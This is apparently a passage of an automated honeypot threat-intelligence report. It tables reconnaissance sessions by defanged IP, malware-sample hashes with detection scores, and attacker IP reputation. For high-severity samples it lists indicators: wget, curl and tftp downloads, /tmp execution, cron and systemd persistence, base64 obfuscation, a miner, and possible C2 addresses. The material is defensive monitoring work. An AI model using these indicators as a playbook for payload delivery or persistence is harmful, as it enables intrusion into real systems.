| IR-7fcc8b82674b | HIGH | `2.57.122[.]150` | 2026-11-27 15:52 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-faded85da4c6 | HIGH | `2.57.122[.]150` | 2026-11-27 15:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1a0a6e144ba9 | HIGH | `2.57.122[.]150` | 2026-11-27 15:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
_… 92 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `195.178.110[.]78` | **3** | 2026-11-27 05:02 | 2026-11-27 08:32 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `91.105.122[.]241` | **3** | 2026-11-27 15:41 | 2026-11-27 18:11 | 1m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]45` | **2** | 2026-11-27 17:10 | 2026-11-27 18:10 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.169.106[.]30` | **2** | 2026-11-27 15:27 | 2026-11-27 16:13 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-11-27 06:29 | 2026-11-27 08:03 | 2m | 0 | `T1592` | 🟢 LOW |
| `177.35.62[.]121` | **2** | 2026-11-27 12:37 | 2026-11-27 14:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]78` | **2** | 2026-11-27 12:58 | 2026-11-27 14:06 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `2.57.122[.]168` | **2** | 2026-11-27 15:44 | 2026-11-27 16:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | **2** | 2026-11-27 09:58 | 2026-11-27 11:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.160.65[.]147` | 1 | 2026-11-27 18:34 | 2026-11-27 18:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]132` | 1 | 2026-11-27 05:14 | 2026-11-27 05:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]136` | 1 | 2026-11-27 05:27 | 2026-11-27 05:27 | 7s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]39` | 1 | 2026-11-27 06:25 | 2026-11-27 06:25 | 8s | 0 | `T1592` | 🟢 LOW |
| `115.22.245[.]254` | 1 | 2026-11-27 10:31 | 2026-11-27 10:31 | 17s | 0 | `T1592` | 🟢 LOW |
| `118.26.36[.]200` | 1 | 2026-11-27 15:31 | 2026-11-27 15:32 | 7s | 0 | `T1592` | 🟢 LOW |
| `119.163.0[.]93` | 1 | 2026-11-27 09:34 | 2026-11-27 09:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `121.146.46[.]146` | 1 | 2026-11-27 15:24 | 2026-11-27 15:24 | 22s | 0 | `T1592` | 🟢 LOW |
| `121.157.30[.]231` | 1 | 2026-11-27 05:21 | 2026-11-27 05:21 | 25s | 0 | `T1592` | 🟢 LOW |
| `121.29.4[.]88` | 1 | 2026-11-27 14:00 | 2026-11-27 14:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-27 11:54 | 2026-11-27 11:54 | 45s | 0 | `T1592` | 🟢 LOW |
| `14.225.206[.]187` | 1 | 2026-11-27 15:22 | 2026-11-27 15:23 | 10s | 0 | `T1592` | 🟢 LOW |
| `151.245.151[.]133` | 1 | 2026-11-27 16:49 | 2026-11-27 16:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `151.245.151[.]47` | 1 | 2026-11-27 16:55 | 2026-11-27 16:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `151.245.151[.]68` | 1 | 2026-11-27 17:10 | 2026-11-27 17:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `163.52.135[.]28` | 1 | 2026-11-27 07:23 | 2026-11-27 07:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.52.135[.]28` | 1 | 2026-11-27 09:56 | 2026-11-27 09:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.52.135[.]28` | 1 | 2026-11-27 13:28 | 2026-11-27 13:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.52.135[.]28` | 1 | 2026-11-27 18:45 | 2026-11-27 18:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-27 07:22 | 2026-11-27 07:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-27 09:39 | 2026-11-27 09:40 | 26s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-27 12:09 | 2026-11-27 12:09 | 22s | 0 | `T1592` | 🟢 LOW |
| `165.22.83[.]9` | 1 | 2026-11-27 18:44 | 2026-11-27 18:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.227.62[.]247` | 1 | 2026-11-27 14:37 | 2026-11-27 14:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `166.62.41[.]96` | 1 | 2026-11-27 06:59 | 2026-11-27 06:59 | 32s | 0 | `T1592` | 🟢 LOW |
| `172.239.71[.]245` | 1 | 2026-11-27 06:51 | 2026-11-27 06:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.228.206[.]187` | 1 | 2026-11-27 11:17 | 2026-11-27 11:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]183` | 1 | 2026-11-27 07:00 | 2026-11-27 07:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.8.166[.]89` | 1 | 2026-11-27 12:01 | 2026-11-27 12:01 | 14s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-27 08:23 | 2026-11-27 08:23 | 9s | 0 | `T1592` | 🟢 LOW |
| `184.105.139[.]69` | 1 | 2026-11-27 09:32 | 2026-11-27 09:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.39.196[.]234` | 1 | 2026-11-27 05:12 | 2026-11-27 05:12 | 14s | 0 | `T1592` | 🟢 LOW |
| `186.226.177[.]239` | 1 | 2026-11-27 14:07 | 2026-11-27 14:07 | 13s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-11-27 16:51 | 2026-11-27 16:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.164.107[.]6` | 1 | 2026-11-27 06:02 | 2026-11-27 06:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | 1 | 2026-11-27 11:13 | 2026-11-27 11:13 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-27 10:51 | 2026-11-27 10:51 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-27 16:13 | 2026-11-27 16:13 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-27 18:46 | 2026-11-27 18:46 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `195.239.97[.]254` | 1 | 2026-11-27 14:18 | 2026-11-27 14:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `196.191.102[.]91` | 1 | 2026-11-27 15:39 | 2026-11-27 15:40 | 32s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]169` | 1 | 2026-11-27 09:31 | 2026-11-27 09:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | 1 | 2026-11-27 15:35 | 2026-11-27 15:35 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.150.193[.]100` | 1 | 2026-11-27 09:18 | 2026-11-27 09:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.83.36[.]27` | 1 | 2026-11-27 17:54 | 2026-11-27 17:54 | 10s | 0 | `T1592` | 🟢 LOW |
| `209.99.190[.]186` | 1 | 2026-11-27 05:52 | 2026-11-27 05:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.226.76[.]130` | 1 | 2026-11-27 10:57 | 2026-11-27 10:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.120.38[.]97` | 1 | 2026-11-27 13:33 | 2026-11-27 13:33 | 14s | 0 | `T1592` | 🟢 LOW |
| `24.63.90[.]162` | 1 | 2026-11-27 13:40 | 2026-11-27 13:40 | 2s | 0 | `T1592` | 🟢 LOW |
| `31.220.0[.]26` | 1 | 2026-11-27 06:31 | 2026-11-27 06:32 | 61s | 0 | `T1592` | 🟢 LOW |
| `31.220.0[.]26` | 1 | 2026-11-27 10:50 | 2026-11-27 10:50 | 3s | 0 | `T1592` | 🟢 LOW |
| `31.43.49[.]178` | 1 | 2026-11-27 13:08 | 2026-11-27 13:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `35.140.101[.]61` | 1 | 2026-11-27 07:31 | 2026-11-27 07:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `41.153.30[.]115` | 1 | 2026-11-27 06:27 | 2026-11-27 06:27 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-11-27 07:45 | 2026-11-27 07:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-11-27 18:31 | 2026-11-27 18:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.56.103[.]154` | 1 | 2026-11-27 05:54 | 2026-11-27 05:54 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-27 08:42 | 2026-11-27 08:42 | 1s | 0 | `T1592` | 🟢 LOW |
| `52.248.42[.]171` | 1 | 2026-11-27 06:59 | 2026-11-27 06:59 | 9s | 0 | `T1592` | 🟢 LOW |
| `58.56.204[.]118` | 1 | 2026-11-27 18:53 | 2026-11-27 18:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.188.249[.]64` | 1 | 2026-11-27 14:21 | 2026-11-27 14:21 | 8s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]148` | 1 | 2026-11-27 16:05 | 2026-11-27 16:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-11-27 07:03 | 2026-11-27 07:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]138` | 1 | 2026-11-27 05:33 | 2026-11-27 05:33 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]92` | 1 | 2026-11-27 08:05 | 2026-11-27 08:05 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-27 11:23 | 2026-11-27 11:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]20` | 1 | 2026-11-27 14:46 | 2026-11-27 14:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]30` | 1 | 2026-11-27 11:32 | 2026-11-27 11:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]203` | 1 | 2026-11-27 13:34 | 2026-11-27 13:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]41` | 1 | 2026-11-27 11:33 | 2026-11-27 11:33 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]47` | 1 | 2026-11-27 11:31 | 2026-11-27 11:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]62` | 1 | 2026-11-27 11:31 | 2026-11-27 11:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]130` | 1 | 2026-11-27 08:07 | 2026-11-27 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.235.141[.]66` | 1 | 2026-11-27 09:48 | 2026-11-27 09:48 | 10s | 0 | `T1592` | 🟢 LOW |
| `76.36.52[.]200` | 1 | 2026-11-27 09:48 | 2026-11-27 09:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]127` | 1 | 2026-11-27 04:59 | 2026-11-27 04:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-27 13:19 | 2026-11-27 13:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-27 17:40 | 2026-11-27 17:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.67.26[.]150` | 1 | 2026-11-27 06:41 | 2026-11-27 06:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.67.26[.]24` | 1 | 2026-11-27 07:03 | 2026-11-27 07:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-27 04:57 | 2026-11-27 04:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-27 08:43 | 2026-11-27 08:43 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-27 13:53 | 2026-11-27 13:53 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-27 18:05 | 2026-11-27 18:05 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-11-27 07:32 | 2026-11-27 07:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.85.4[.]145` | 1 | 2026-11-27 11:30 | 2026-11-27 11:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `8.134.157[.]132` | 1 | 2026-11-27 06:31 | 2026-11-27 06:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.191.192[.]102` | 1 | 2026-11-27 16:15 | 2026-11-27 16:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-11-27 11:24 | 2026-11-27 11:24 | 13s | 0 | `T1592` | 🟢 LOW |
| `82.198.175[.]226` | 1 | 2026-11-27 04:59 | 2026-11-27 04:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]28` | 1 | 2026-11-27 07:25 | 2026-11-27 07:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]28` | 1 | 2026-11-27 09:35 | 2026-11-27 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]4` | 1 | 2026-11-27 11:29 | 2026-11-27 11:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]45` | 1 | 2026-11-27 16:34 | 2026-11-27 16:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]160` | 1 | 2026-11-27 06:15 | 2026-11-27 06:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]3` | 1 | 2026-11-27 09:55 | 2026-11-27 09:55 | 2s | 0 | `T1592` | 🟢 LOW |
| `88.205.172[.]170` | 1 | 2026-11-27 13:41 | 2026-11-27 13:41 | 30s | 0 | `T1592` | 🟢 LOW |
| `91.221.210[.]47` | 1 | 2026-11-27 15:48 | 2026-11-27 15:49 | 13s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-11-27 18:14 | 2026-11-27 18:14 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1b3d42e9c13d4d3c0ac6b6aa1584d060b3bc354936be815e12c9a243a470c7f3` | Shell Script | `1b3d42e9c13d4d3c...` | 52/100 | 🟡 MEDIUM | **5/74** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `78.85.4[.]145` | RU | PJSC Rostelecom | **100** ⚠️ | 3 |
| `165.22.83[.]9` | DE | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `154.125.228[.]145` | SN | SONATEL Societe Nationale Des Telecommunications Du Senegal | **100** ⚠️ | 34 |
| `109.160.32[.]132` | NL | Global Communication Net Plc | **100** ⚠️ | 34 |
| `151.245.151[.]133` | NL | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `103.160.65[.]147` | IN | Vmps Internet Private Limited | **100** ⚠️ | 6 |
| `99.92.204[.]98` | US | Private Customer - AT&T Internet Services | **100** ⚠️ | 50 |
| `64.89.160[.]135` | DE | Blatant Technologies, LLC | **100** ⚠️ | 50 |
| `184.105.139[.]69` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `60.188.249[.]64` | CN | CHINANET-ZJ Taizhou node network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 240 |
